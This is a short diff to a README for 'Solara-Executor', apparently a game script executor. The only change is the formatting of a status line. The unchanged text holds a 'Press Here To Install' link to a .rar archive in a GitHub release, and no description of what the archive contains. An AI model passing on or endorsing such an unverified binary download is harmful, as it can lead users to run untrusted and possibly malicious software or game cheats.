@@ -1,5 +1,5 @@
 # Solara-Executor
- Status:Work✅
+* Status - Work✅
 
  👉 [Press Here To Install](https://github.com/safirbut/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
 
